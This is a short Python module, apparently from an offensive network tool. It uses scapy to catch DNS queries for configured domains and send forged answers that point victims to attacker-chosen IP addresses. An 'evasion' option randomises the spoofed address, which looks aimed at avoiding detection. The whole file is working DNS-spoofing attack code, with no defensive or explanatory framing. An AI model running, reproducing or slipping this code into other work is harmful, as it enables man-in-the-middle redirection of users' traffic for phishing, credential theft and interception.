from scapy.all import *
import logging
import random

logger = logging.getLogger(__name__)

async def dns_spoof(packet, config):
    if packet.haslayer(DNSQR) and packet[DNS].qr == 0:
        dns = packet[DNS]
        try:
            for domain in config.get('dns_spoof', []):
                if domain['domain'].encode() in dns.qd.qname:
                    spoofed_ip = domain['to_ip']
                    if config['evasion']['dynamic_payload']:
                        spoofed_ip = f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                    spoofed = IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=53)/DNS(id=dns.id, qr=1, aa=1, qd=dns.qd, an=DNSRR(rrname=dns.qd.qname, rdata=spoofed_ip))
                    send(spoofed, iface=config['interface'])
                    logger.info(f"DNS spoofed {domain['domain']} to {spoofed_ip}")
                    return True
        except Exception as e:
            logger.error(f"Error in DNS spoofing: {e}")
    return False
